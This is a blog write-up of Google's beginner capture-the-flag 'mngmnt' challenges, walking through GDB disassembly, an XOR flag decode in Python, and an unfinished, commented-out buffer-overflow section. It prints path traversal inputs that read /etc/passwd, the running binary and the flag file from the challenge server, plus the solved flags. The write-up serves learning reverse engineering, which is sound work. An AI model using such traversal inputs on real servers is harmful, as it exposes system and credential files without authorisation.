---
aliases: ['/2019/04/29/Buffer-Overflows-and-Stacks-and-Assembly-Oh-My.html']
title: "Buffer Overflows and Stacks and Assembly, Oh My!"
date: 2019-04-29
excerpt: Reverse Engineering for fun and profit
taxonomies:
  tags:
    - stories
---

Google has a 'Intro' Capture The Flag competition at
[https://capturetheflag.withgoogle.com/#beginners/](https://capturetheflag.withgoogle.com/#beginners/).
I've been trying it out because, why not?
The challenges aren't easy by any means - they range from javascript crypto
(let me know if you find out how to break JS Safe!) to SQL injections to steganography.
The challenge this post about, however, is a reverse engineering challenge: three, in fact.

10-second summary of reverse engineering: you have a binary and no source code,
and you want to exploit it somehow. In this case, the binary is across a network
connection, so you can't modify the code, you have to use what's there already.
If you want to try it yourself, the binary is [here](/assets/mngmnt),
it runs on 64-bit Linux 2.4+ (but may work on other machines, I haven't tried).
I highly recommend going through the whole CTF first, though.

## Challenge 1
> Do some black box testing here, it'll go well with your hat.
> `nc mngmnt-iface.ctfcompetition.com 1337`

When you connect, you get a screen saying

```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

Let's read the patchnotes!

```
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
Version0.2
# Release 0.2
 - Updated library X to version 0.Y
 - Fixed path traversal bug
 - Improved the UX
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
Version0.3
# Version 0.3
 - Rollback of version 0.2 because of random reasons
 - Blah Blah
 - Fix random reboots at 2:32 every second Friday when it's new-moon.
```


Well, look at that. There's a path traversal bug:
fixed in .2 and rolled back in .3 for 'random reasons'.
A path traversal bug is when you have a public server which is meant to serve
files in the starting directory, but instead servers files from the whole machine if
you use relative paths. An example:

```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
...
user:x:1337:1337::/home/user:
```

From here you have a couple options to get the flag: you can either guess
('fuzz') the filename, or you can download the binary and see what file it's
trying to open. Let's do the second.

But wait, how do we get the binary? It turns out on linux there's a `proc` filesystem
which _looks_ like it has a bunch of files but really is a bunch of kernel info about
the running system. What that means for us is we can get the program without knowing the filename or current directory.

```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../../../proc/self/exe
ELF>PAAA@X�@8
... more binary follows ...
```

`/proc` is the start of the filesystem, `self` is the directory for the currently running process
(in this case the vulnerable program), and `exe` is the executable file as it was
when the process started running. So now that we've got the binary, we can take a look at what it's doing.

### Enter GDB
If you don't know how to use GDB, I highly recommend learning. Not only will it
be useful for debugging your own code, but it's the main way I know of to
reverse engineer executables.

The first thing I normally do is look at the main function:

```
gdb -q ./mngmnt
Reading symbols from ./mngmnt...done.
(gdb) break main
Breakpoint 1 at 0x41414660: file main.cpp, line 133.
(gdb) run
Starting program: /home/jyn/Documents/Programming/challenges/googlectf/mngmnt

Breakpoint 1, main (argc=1, argv=0x7fffffffdc28) at main.cpp:133
133     main.cpp: No such file or directory.
(gdb) disas
Dump of assembler code for function main(int, char**):
   0x0000000041414648 <+0>:     push   %rbp
   0x0000000041414649 <+1>:     mov    %rsp,%rbp
   0x000000004141464c <+4>:     sub    $0x1e0,%rsp
   0x0000000041414653 <+11>:    mov    %edi,-0x1d4(%rbp)
   0x0000000041414659 <+17>:    mov    %rsi,-0x1e0(%rbp)
=> 0x0000000041414660 <+24>:    mov    0x201a99(%rip),%rax        # 0x41616100 <stdin@@GLIBC_2.2.5>

... lots of assembly follows, about 600 lines ...
```

Well that's a lot to look at. There's a function called `primary_login`
about halfway down though, that looks promising.

```
(gdb) break primary_login()
Breakpoint 2 at 0x41414576: file main.cpp, line 112.
(gdb) continue
Continuing.
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1

Breakpoint 2, primary_login () at main.cpp:112
112     in main.cpp
(gdb) disas
Dump of assembler code for function primary_login():
   0x000000004141456b <+0>:     push   %rbp
   0x000000004141456c <+1>:     mov    %rsp,%rbp
   0x000000004141456f <+4>:     sub    $0x110,%rsp
=> 0x0000000041414576 <+11>:    lea    0x62b(%rip),%rdi        # 0x41414ba8
   0x000000004141457d <+18>:    callq  0x400a90 <puts@plt>
   0x0000000041414582 <+23>:    mov    $0x0,%esi
   0x0000000041414587 <+28>:    lea    0x49e(%rip),%rdi        # 0x41414a2c <_ZL9FLAG_FILE>
   0x000000004141458e <+35>:    mov    $0x0,%eax
   0x0000000041414593 <+40>:    callq  0x400be0 <open@plt>
... about 200 more lines of assembly ...
```

What's `_ZL9FLAG_FILE`?

```
(gdb) printf "%s\n", 0x41414a2c
flag
```

After all that, that was it? Well, at least we know how to get the flag now.
One last trick - we can get the current directory of the running process with
`/proc/self/cwd`:

```
nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../../../proc/self/cwd/flag
CTF{I_luv_buggy_sOFtware}
```

## Challenge 2
That got our feet wet. The next challenge is a bit trickier.
Can we get through the login screen?

```
nc mngmnt-iface.ctfcompetition.com 1337'
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
CTF{I_luv_buggy_sOFtware}
! Two factor authentication required !
Please enter secret secondary password:
```

Oh boy, what now? Let's look at the program again.

```
gdb ./mngmnt
Reading symbols from ./mngmnt...done.
(gdb) disas primary_login
Dump of assembler code for function primary_login():
... lots of code ...
   0x0000000041414627 <+188>:   jne    0x41414630 <primary_login()+197>
   0x0000000041414629 <+190>:   callq  0x41414446 <secondary_login()>
   0x000000004141462e <+195>:   jmp    0x41414646 <primary_login()+219>
   0x0000000041414630 <+197>:   lea    0x5b9(%rip),%rdi        # 0x41414bf0
   0x0000000041414637 <+204>:   callq  0x400a90 <puts@plt>
   0x000000004141463c <+209>:   mov    $0x1,%edi
---Type <return> to continue, or q <return> to quit---
   0x0000000041414641 <+214>:   callq  0x400aa0 <exit@plt>
   0x0000000041414646 <+219>:   leaveq
   0x0000000041414647 <+220>:   retq
End of assembler dump.
```

`secondary_login` looks promising, what's that look like?
Note: this is really long because we do need to read it this time.

```
(gdb) disas secondary_login
Dump of assembler code for function secondary_login():
   0x0000000041414446 <+0>:     push   %rbp
   0x0000000041414447 <+1>:     mov    %rsp,%rbp
   0x000000004141444a <+4>:     sub    $0x90,%rsp
   0x0000000041414451 <+11>:    lea    0x6d8(%rip),%rdi        # 0x41414b30
   0x0000000041414458 <+18>:    callq  0x400a90 <puts@plt>
   0x000000004141445d <+23>:    lea    0x6f4(%rip),%rdi        # 0x41414b58
   0x0000000041414464 <+30>:    callq  0x400a90 <puts@plt>
   0x0000000041414469 <+35>:    lea    -0x90(%rbp),%rax
   0x0000000041414470 <+42>:    mov    %rax,%rsi
   0x0000000041414473 <+45>:    lea    0x706(%rip),%rdi        # 0x41414b80
   0x000000004141447a <+52>:    mov    $0x0,%eax
   0x000000004141447f <+57>:    callq  0x400b00 <scanf@plt>
   0x0000000041414484 <+62>:    lea    -0x90(%rbp),%rax
   0x000000004141448b <+69>:    mov    %rax,%rdi
   0x000000004141448e <+72>:    callq  0x400b10 <strlen@plt>
   0x0000000041414493 <+77>:    mov    %rax,-0x10(%rbp)
   0x0000000041414497 <+81>:    movq   $0x0,-0x8(%rbp)
   0x000000004141449f <+89>:    mov    -0x8(%rbp),%rax
   0x00000000414144a3 <+93>:    cmp    -0x10(%rbp),%rax
   0x00000000414144a7 <+97>:    jae    0x414144d6 <secondary_login()+144>
   0x00000000414144a9 <+99>:    lea    -0x90(%rbp),%rdx
   0x00000000414144b0 <+106>:   mov    -0x8(%rbp),%rax
   0x00000000414144b4 <+110>:   add    %rdx,%rax
   0x00000000414144b7 <+113>:   movzbl (%rax),%eax
   0x00000000414144ba <+116>:   xor    $0xffffffc7,%eax
   0x00000000414144bd <+119>:   mov    %eax,%ecx
   0x00000000414144bf <+121>:   lea    -0x90(%rbp),%rdx
   0x00000000414144c6 <+128>:   mov    -0x8(%rbp),%rax
   0x00000000414144ca <+132>:   add    %rdx,%rax
   0x00000000414144cd <+135>:   mov    %cl,(%rax)
   0x00000000414144cf <+137>:   addq   $0x1,-0x8(%rbp)
   0x00000000414144d4 <+142>:   jmp    0x4141449f <secondary_login()+89>
   0x00000000414144d6 <+144>:   cmpq   $0x23,-0x10(%rbp)
   0x00000000414144db <+149>:   jne    0x41414537 <secondary_login()+241>
   0x00000000414144dd <+151>:   mov    0x55c(%rip),%rax        # 0x41414a40 <_ZL4FLAG>
   0x00000000414144e4 <+158>:   mov    0x55d(%rip),%rdx        # 0x41414a48 <_ZL4FLAG+8>
   0x00000000414144eb <+165>:   mov    %rax,-0x90(%rbp)
   0x00000000414144f2 <+172>:   mov    %rdx,-0x88(%rbp)
   0x00000000414144f9 <+179>:   mov    0x550(%rip),%rax        # 0x41414a50 <_ZL4FLAG+16>
   0x0000000041414500 <+186>:   mov    0x551(%rip),%rdx        # 0x41414a58 <_ZL4FLAG+24>
   0x0000000041414507 <+193>:   mov    %rax,-0x80(%rbp)
   0x000000004141450b <+197>:   mov    %rdx,-0x78(%rbp)
   0x000000004141450f <+201>:   movzwl 0x54a(%rip),%eax        # 0x41414a60 <_ZL4FLAG+32>
   0x0000000041414516 <+208>:   mov    %ax,-0x70(%rbp)
   0x000000004141451a <+212>:   movzbl 0x541(%rip),%eax        # 0x41414a62 <_ZL4FLAG+34>
   0x0000000041414521 <+219>:   mov    %al,-0x6e(%rbp)
   0x0000000041414524 <+222>:   lea    -0x90(%rbp),%rax
---Type <return> to continue, or q <return> to quit---
   0x000000004141452b <+229>:   test   %rax,%rax
   0x000000004141452e <+232>:   je     0x41414537 <secondary_login()+241>
   0x0000000041414530 <+234>:   mov    $0x1,%eax
   0x0000000041414535 <+239>:   jmp    0x4141453c <secondary_login()+246>
   0x0000000041414537 <+241>:   mov    $0x0,%eax
   0x000000004141453c <+246>:   test   %al,%al
   0x000000004141453e <+248>:   je     0x41414553 <secondary_login()+269>
   0x0000000041414540 <+250>:   lea    0x63f(%rip),%rdi        # 0x41414b86
   0x0000000041414547 <+257>:   callq  0x400a90 <puts@plt>
   0x000000004141454c <+262>:   callq  0x4141428e <command_line()>
   0x0000000041414551 <+267>:   jmp    0x41414569 <secondary_login()+291>
   0x0000000041414553 <+269>:   lea    0x63a(%rip),%rdi        # 0x41414b94
   0x000000004141455a <+276>:   callq  0x400a90 <puts@plt>
   0x000000004141455f <+281>:   mov    $0x1,%edi
   0x0000000041414564 <+286>:   callq  0x400aa0 <exit@plt>
   0x0000000041414569 <+291>:   leaveq
   0x000000004141456a <+292>:   retq
```

There's a few things of note here. First is the `command_line` function,
which looks promising. Next is `_ZL4FLAG`, which seems useful. What's there?

```
(gdb) printf "%s\n", 0x41414a40
�����������������������������������/bin/sh
```

That's not helpful, it's binary data. And why does it have a shell at the end there?
And finally, how do we get to `command_line`? Let's trace the execution.
If you've heard of 'basic blocks' in compilers, that's basically what we're going
to do now: split up the code into segments divided by jumps.

First we start at +0. Then execution is linear until line +93, where there's a
`cmp` (compare) and a `jae` (jump above equal) to +144. At 144, it compares
-0x10(%rbp) to 0x23, or 35 in decimal.

That's funny, the number of `�` characters in the data above is 35.
Coincidence? I think not. What happens if we just put in a string with 35 characters?

```
! Two factor authentication required !
Please enter secret secondary password:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Authenticated
>
```

Wait, what? That's it? Where's the flag?
It turns out this program forgot to check that you had the right password.
I couldn't figure out what was going on, so I cheated and looked at
https://jhalon.github.io/2018-google-ctf-beginners-pwn-solutions-1/
(which is a much better writeup). Long story short, there's an inner loop
doing funny things with `xor`. If we xor the binary at `_ZL4FLAG` with
`0xc7`, we get back the flag. GDB and python will both be helpful here.

```
(gdb) print/x _ZL4FLAG
$5 = {0x84, 0x93, 0x81, 0xbc, 0x93, 0xb0, 0xa8, 0x98, 0x97, 0xa6, 0xb4, 0x94, 0xb0, 0xa8,
  0xb5, 0x83, 0xbd, 0x98, 0x85, 0xa2, 0xb3, 0xb3, 0xa2, 0xb5, 0x98, 0xb3, 0xaf, 0xf3, 0xa9,
  0x98, 0xf6, 0x98, 0xac, 0xf8, 0xba}
(gdb) quit
$ python -q
>>> import re
>>> hexes = """0x84, 0x93, 0x81, 0xbc, 0x93, 0xb0, 0xa8, 0x98, 0x97, 0xa6, 0xb4, 0x94, 0xb0, 0xa8,
...   0xb5, 0x83, 0xbd, 0x98, 0x85, 0xa2, 0xb3, 0xb3, 0xa2, 0xb5, 0x98, 0xb3, 0xaf, 0xf3, 0xa9,
...   0x98, 0xf6, 0x98, 0xac, 0xf8, 0xba"""
>>> chars = ''.join(hexes.split()).replace(',', '').replace('0x', '')
>>> chars
'849381bc93b0a89897a6b494b0a8b583bd9885a2b3b3a2b598b3aff3a998f698acf8ba'
>>> ''.join([chr(int(c, 16) ^ 0xc7) for c in re.findall('..', chars)])
'CTF{Two_PasSworDz_Better_th4n_1_k?}'
```

Quick explanation of that awful and hacky code:
`print/x` means print as hexidecimal instead of decimal or binary.
`''.join(hexes.split())` is a hacky way of removing whitespace.
The `replace` calls are just getting rid of formatting we don't care about.
`re.findall('..', chars)` splits the strings into 2-character sequences.
The rest is a list comprehesion which converts each string to an int,
xors it with hexidecimal c7, then finally joins the whole list into a string.

Side note: originally this was even more hacky - I used gdb's `<address>@n` syntax
which gives you back the memory in architecture-endian order. 1/10 do not recommend.

<!--

## Challenge 3
> It's a sure bet that they can't handle their memory properly

The last challenge was also the hardest to exploit. Once you enter the second flag,
you get a shell without any instructions:

```
$  ./mngmnt
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
flag
! Two factor authentication required !
Please enter secret secondary password:
CTF{Two_PasSworDz_Better_th4n_1_k?}
Authenticated
> help
Unknown command 'help'
> ls
Unknown command 'ls'
> whoami
Unknown command 'whoami'
```

Let's see if we can find what's going on. Looking back up at the assembly,
we see that it calls `command_line` once you put in the second password.
What's that doing?

```
gdb ./mngmnt
Reading symbols from ./mngmnt...done.
(gdb) disas command_line
Dump of assembler code for function command_line():
   0x000000004141428e <+0>:     push   %rbp
   0x000000004141428f <+1>:     mov    %rsp,%rbp
   0x0000000041414292 <+4>:     push   %rbx
   0x0000000041414293 <+5>:     sub    $0x128,%rsp
   0x000000004141429a <+12>:    lea    0x7ca(%rip),%rdi        # 0x41414a6b
   0x00000000414142a1 <+19>:    mov    $0x0,%eax
   0x00000000414142a6 <+24>:    callq  0x400a70 <printf@plt>
   0x00000000414142ab <+29>:    lea    -0x30(%rbp),%rax
   0x00000000414142af <+33>:    mov    %rax,%rdi
   0x00000000414142b2 <+36>:    callq  0x4141423a <getsx(char*)>
   0x00000000414142b7 <+41>:    mov    0x201e77(%rip),%eax        # 0x41616134 <_ZL13cmds_executed>
   0x00000000414142bd <+47>:    add    $0x1,%eax
   0x00000000414142c0 <+50>:    mov    %eax,0x201e6e(%rip)        # 0x41616134 <_ZL13cmds_executed>
   0x00000000414142c6 <+56>:    lea    -0x30(%rbp),%rax
   0x00000000414142ca <+60>:    lea    0x79d(%rip),%rsi        # 0x41414a6e
   0x00000000414142d1 <+67>:    mov    %rax,%rdi
   0x00000000414142d4 <+70>:    callq  0x400ba0 <strcmp@plt>
   0x00000000414142d9 <+75>:    test   %eax,%eax
   0x00000000414142db <+77>:    jne    0x414142ee <command_line()+96>
   0x00000000414142dd <+79>:    lea    0x78f(%rip),%rdi        # 0x41414a73
   0x00000000414142e4 <+86>:    callq  0x400a90 <puts@plt>
   0x00000000414142e9 <+91>:    jmpq   0x4141443c <command_line()+430>
   0x00000000414142ee <+96>:    lea    -0x30(%rbp),%rax
   0x00000000414142f2 <+100>:   lea    0x77f(%rip),%rsi        # 0x41414a78
   0x00000000414142f9 <+107>:   mov    %rax,%rdi
   0x00000000414142fc <+110>:   callq  0x400ba0 <strcmp@plt>
   0x0000000041414301 <+115>:   test   %eax,%eax
   0x0000000041414303 <+117>:   jne    0x41414313 <command_line()+133>
   0x0000000041414305 <+119>:   lea    0x774(%rip),%rdi        # 0x41414a80
   0x000000004141430c <+126>:   callq  0x400a90 <puts@plt>
... snip ...
   0x00000000414143ff <+369>:   lea    0x708(%rip),%rdi        # 0x41414b0e
   0x0000000041414406 <+376>:   callq  0x400a90 <puts@plt>
   0x000000004141440b <+381>:   lea    -0x130(%rbp),%rax
   0x0000000041414412 <+388>:   mov    %rax,%rdi
   0x0000000041414415 <+391>:   callq  0x400ae0 <system@plt>
   0x000000004141441a <+396>:   jmpq   0x4141429a <command_line()+12>
---Type <return> to continue, or q <return> to quit---
   0x000000004141441f <+401>:   lea    -0x30(%rbp),%rax
   0x0000000041414423 <+405>:   mov    %rax,%rsi
   0x0000000041414426 <+408>:   lea    0x6ec(%rip),%rdi        # 0x41414b19
   0x000000004141442d <+415>:   mov    $0x0,%eax
   0x0000000041414432 <+420>:   callq  0x400a70 <printf@plt>
   0x0000000041414437 <+425>:   jmpq   0x4141429a <command_line()+12>
   0x000000004141443c <+430>:   add    $0x128,%rsp
   0x0000000041414443 <+437>:   pop    %rbx
   0x0000000041414444 <+438>:   pop    %rbp
   0x0000000041414445 <+439>:   retq
```

This looks long and compilicated, but it's really doing the same thing
over and over: comparing a string to a bunch of other strings.
That begs the question: What other strings?

```
(gdb) printf "%s\n", 0x41414a6e
quit
(gdb) printf "%s\n", 0x41414a78
version
(gdb) printf "%s\n", 0x41414a8c
shell
(gdb) printf "%s\n", 0x41414ac3
echo
(gdb) printf "%s\n", 0x41414ac8
debug
```

Let's see what these do.

```
> version
Version 0.3
> shell
Security made us disable the shell, sorry!
> echo hi
hi
> debug
Debug data dump:
 pid=30575 cmds executed=0x41616134->8 Mappings:
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /proc/30575/maps
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 00400000-00401000 r-xp 00000000 08:04 315016                             /home/jyn/Documents/Programming/challenges/googlectf/mngmnt
   2   │ 41414000-41415000 r-xp 00014000 08:04 315016                             /home/jyn/Documents/Programming/challenges/googlectf/mngmnt
   3   │ 41615000-41616000 r--p 00015000 08:04 315016                             /home/jyn/Documents/Programming/challenges/googlectf/mngmnt
   4   │ 41616000-41617000 rw-p 00016000 08:04 315016                             /home/jyn/Documents/Programming/challenges/googlectf/mngmnt
   5   │ 41617000-41638000 rw-p 00000000 00:00 0                                  [heap]
   6   │ 7ffff70a5000-7ffff728c000 r-xp 00000000 08:05 1840331                    /lib/x86_64-linux-gnu/libc-2.27.so
   7   │ 7ffff728c000-7ffff748c000 ---p 001e7000 08:05 1840331                    /lib/x86_64-linux-gnu/libc-2.27.so
   8   │ 7ffff748c000-7ffff7490000 r--p 001e7000 08:05 1840331                    /lib/x86_64-linux-gnu/libc-2.27.so
   9   │ 7ffff7490000-7ffff7492000 rw-p 001eb000 08:05 1840331                    /lib/x86_64-linux-gnu/libc-2.27.so
  10   │ 7ffff7492000-7ffff7496000 rw-p 00000000 00:00 0 
  11   │ 7ffff7496000-7ffff74ad000 r-xp 00000000 08:05 1840694                    /lib/x86_64-linux-gnu/libgcc_s.so.1
  12   │ 7ffff74ad000-7ffff76ac000 ---p 00017000 08:05 1840694                    /lib/x86_64-linux-gnu/libgcc_s.so.1
  13   │ 7ffff76ac000-7ffff76ad000 r--p 00016000 08:05 1840694                    /lib/x86_64-linux-gnu/libgcc_s.so.1
  14   │ 7ffff76ad000-7ffff76ae000 rw-p 00017000 08:05 1840694                    /lib/x86_64-linux-gnu/libgcc_s.so.1
  15   │ 7ffff76ae000-7ffff784b000 r-xp 00000000 08:05 1840394                    /lib/x86_64-linux-gnu/libm-2.27.so
  16   │ 7ffff784b000-7ffff7a4a000 ---p 0019d000 08:05 1840394                    /lib/x86_64-linux-gnu/libm-2.27.so
  17   │ 7ffff7a4a000-7ffff7a4b000 r--p 0019c000 08:05 1840394                    /lib/x86_64-linux-gnu/libm-2.27.so
  18   │ 7ffff7a4b000-7ffff7a4c000 rw-p 0019d000 08:05 1840394                    /lib/x86_64-linux-gnu/libm-2.27.so
  19   │ 7ffff7a4c000-7ffff7bc5000 r-xp 00000000 08:05 1706663                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
  20   │ 7ffff7bc5000-7ffff7dc5000 ---p 00179000 08:05 1706663                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
  21   │ 7ffff7dc5000-7ffff7dcf000 r--p 00179000 08:05 1706663                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
  22   │ 7ffff7dcf000-7ffff7dd1000 rw-p 00183000 08:05 1706663                    /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
  23   │ 7ffff7dd1000-7ffff7dd5000 rw-p 00000000 00:00 0 
  24   │ 7ffff7dd5000-7ffff7dfc000 r-xp 00000000 08:05 1840303                    /lib/x86_64-linux-gnu/ld-2.27.so
  25   │ 7ffff7fc4000-7ffff7fca000 rw-p 00000000 00:00 0 
  26   │ 7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
  27   │ 7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
  28   │ 7ffff7ffc000-7ffff7ffd000 r--p 00027000 08:05 1840303                    /lib/x86_64-linux-gnu/ld-2.27.so
  29   │ 7ffff7ffd000-7ffff7ffe000 rw-p 00028000 08:05 1840303                    /lib/x86_64-linux-gnu/ld-2.27.so
  30   │ 7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
  31   │ 7ffffffdd000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
  32   │ ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
> quit
Bye!
```

Well, no dice. That debug info is a little strange.
And why have a shell option if it's disabled?
Let's look at that more closely.

```
   0x0000000041414317 <+137>:   lea    0x76e(%rip),%rsi        # 0x41414a8c
   0x000000004141431e <+144>:   mov    %rax,%rdi
   0x0000000041414321 <+147>:   callq  0x400ba0 <strcmp@plt>
   0x0000000041414326 <+152>:   test   %eax,%eax
   0x0000000041414328 <+154>:   jne    0x41414353 <command_line()+197>
   0x000000004141432a <+156>:   movzbl 0x201e07(%rip),%eax        # 0x41616138 <_ZL13shell_enabled>
   0x0000000041414331 <+163>:   xor    $0x1,%eax
   0x0000000041414334 <+166>:   test   %al,%al
   0x0000000041414336 <+168>:   je     0x41414349 <command_line()+187>
   0x0000000041414338 <+170>:   lea    0x759(%rip),%rdi        # 0x41414a98
   0x000000004141433f <+177>:   callq  0x400a90 <puts@plt>
   0x0000000041414344 <+182>:   jmpq   0x4141429a <command_line()+12>
   0x0000000041414349 <+187>:   callq  0x41414227 <debug_shell()>
```

This is basically doing three things - checking if we input 'shell',
checking if `_ZL13shell_enabled` is 0, and if so launching a shell on the host.
Unfortunately, `_ZL13shell_enabled` is _always_ 0. What can we do?

Well, the challenge description mentioned memory.
Could there be a buffer overrun somewhere? Let's open gdb and check it out.
For this bit I'm actually going to use a gdb addon called
[peda](https://github.com/longld/peda) which makes debugging much nicer
without changing any behaviour.

What happens if we put in a really long string?

```

!-->

(Challenge 3 will probably not be forthcoming, I finished it but never got around to writing it up.)
